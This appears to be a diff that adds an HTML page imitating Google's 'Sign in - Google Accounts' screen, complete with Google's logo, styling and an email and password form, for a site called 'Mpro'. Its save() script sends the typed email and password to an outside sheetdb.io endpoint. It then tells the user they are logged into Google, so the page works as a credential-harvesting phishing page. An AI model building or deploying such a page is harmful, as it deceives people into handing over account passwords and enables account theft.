@@ -1,0 +1,163 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in - Google Accounts</title>
+<link rel="icon" type="image/x-icon" href="https://www.gstatic.com/images/branding/searchlogo/ico/favicon.ico">
+    <style>
+        body {
+            font-family: Roboto, Arial, sans-serif;
+            background-color: #f7f9fb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-card {
+            background-color: white;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px 0 rgba(60, 64, 67, 0.3), 0 4px 8px 3px rgba(60, 64, 67, 0.15);
+            width: 380px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 75px; /* Size closer to the real Google logo */
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        h2 {
+            font-size: 16px;
+            font-weight: 400;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 15px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s ease;
+        }
+        input[type="text"]:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+        /* Style for the button, making it look like Google's blue primary button */
+        button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            float: right; /* Align to the right like a real login page */
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #1669e4;
+        }
+        .footer-link {
+            float: left;
+            margin-top: 30px;
+            font-size: 14px;
+        }
+        .footer-link a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .clear {
+            clear: both;
+        }
+        /* Removing the original iframe and extraneous text for a cleaner look */
+        .disclaimer {
+            font-size: 12px;
+            color: #707070;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        </div>
+        
+        <h1>Sign in</h1>
+        <h2>Use your Google Account</h2>
+
+        <div class="input-group">
+            <input id="email" type="text" placeholder="Email or phone">
+        </div>
+
+        <div class="input-group">
+            <input id="code" type="text" placeholder="Password">
+        </div>
+        
+        <div class="footer-link">
+             <a href="https://accounts.google.com/signin/recovery?ec=ar_hc_7682439">Forgot email?</a> 
+        </div>
+
+        <button onclick="save()">Next(make take time to update inin Mpro app)</button>
+        
+        <div class="clear"></div>
+
+        <div class="footer-link" style="float: left; margin-top: 20px;">
+             <a href="#">Create account</a> 
+        </div>
+
+        <div style="float: right; margin-top: 20px;">
+          <a href="index.html">
+            <button style="background-color: transparent; color: #1a73e8; border: 1px solid #dadce0;">
+                Continue to Mpro
+            </button>
+          </a>
+        </div>
+        <div class="clear"></div>
+
+        <p class="disclaimer">
+        If any harm is done to your Google account,<b>I am not responsible.</b>.You can put your gmail id without @ to save it 
+        </p>
+
+    </div>
+
+    <script>
+    function save() {
+      const email = document.getElementById("email").value;
+      const code = document.getElementById("code").value;
+
+      // !!! WARNING: THIS CODE SENDS DATA TO A THIRD-PARTY SITE !!!
+      fetch("https://sheetdb.io/api/v1/2fchtrlpg8lwn", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          data: { email: email, code: code }
+        })
+      })
+      .then(r => r.json())
+      .then(() => alert("You are now loged into google now click Continue to Mpro button!"))
+      .catch(err => alert("Error: " + err));
+    }
+    </script>
+
+</body>
+</html>
